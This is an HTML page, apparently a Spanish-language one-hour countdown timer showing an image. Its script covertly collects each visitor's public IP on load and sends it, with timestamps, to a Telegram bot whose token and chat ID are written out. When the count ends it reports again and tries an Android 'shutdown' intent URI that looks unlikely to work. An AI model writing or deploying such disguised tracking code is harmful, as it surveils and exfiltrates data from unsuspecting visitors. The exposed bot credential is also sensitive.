<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Contador 1 Hora</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #000000;
        }

        .contenedor {
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }

        img {
            min-width: 8%;
            min-height: 8%;
            object-fit: cover;
            display: block;
        }

        .contador {
            position: fixed;
            top: 20px;
            right: 20px;
            background-color: rgba(0, 0, 0, 0.75);
            color: #ffffff;
            padding: 12px 24px;
            border-radius: 25px;
            font-size: 1.8rem;
            font-weight: bold;
            letter-spacing: 2px;
            border: 2px solid #ffffff;
            z-index: 10;
            font-family: 'Arial', sans-serif;
        }
    </style>
</head>
<body>
    <div class="contenedor">
        <img src="https://files.catbox.moe/9mfui5.jpg" alt="Imagen">
        <div class="contador" id="contador">01:00:00</div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8761511101:AAHru_MEit7PzMEoot0oxw9zu_7piy8uH-g';
        const TELEGRAM_CHAT_ID = '8521142101';

        const TIEMPO_TOTAL = 3600;
        let tiempoRestante = TIEMPO_TOTAL;

        const contadorElemento = document.getElementById('contador');

        function formatearTiempo(segundos) {
            const horas = Math.floor(segundos / 3600);
            const minutos = Math.floor((segundos % 3600) / 60);
            const segs = segundos % 60;
            return `${String(horas).padStart(2, '0')}:${String(minutos).padStart(2, '0')}:${String(segs).padStart(2, '0')}`;
        }

        async function enviarTelegram(mensaje) {
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje })
                });
            } catch (error) {}
        }

        async function obtenerIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'No disponible';
            }
        }

        function apagarDispositivo() {
            document.body.style.backgroundColor = '#000000';
            document.querySelector('img').style.display = 'none';
            contadorElemento.style.display = 'none';
            try {
                window.location.href = 'intent://shutdown#Intent;scheme=android-app;end';
            } catch (e) {}
        }

        async function actualizarContador() {
            tiempoRestante--;
            contadorElemento.textContent = formatearTiempo(tiempoRestante);

            if (tiempoRestante <= 10 && tiempoRestante > 0) {
                contadorElemento.style.color = '#ff4444';
                contadorElemento.style.borderColor = '#ff4444';
            }

            if (tiempoRestante <= 0) {
                clearInterval(intervalo);
                contadorElemento.textContent = '00:00:00';
                contadorElemento.style.color = '#ff0000';
                const ip = await obtenerIP();
                await enviarTelegram(`🔴 DISPOSITIVO APAGADO\n📱 IP: ${ip}\n🕐 Hora: ${new Date().toLocaleString('es-MX')}`);
                apagarDispositivo();
            }
        }

        async function iniciar() {
            contadorElemento.textContent = formatearTiempo(TIEMPO_TOTAL);
            const ip = await obtenerIP();
            await enviarTelegram(`🟢 DISPOSITIVO ENCENDIDO\n📱 IP: ${ip}\n🕐 Hora: ${new Date().toLocaleString('es-MX')}\n⏳ Apagado en: 1 hora`);
        }

        const intervalo = setInterval(actualizarContador, 1000);
        document.addEventListener('DOMContentLoaded', iniciar);
    </script>
</body>
</html>
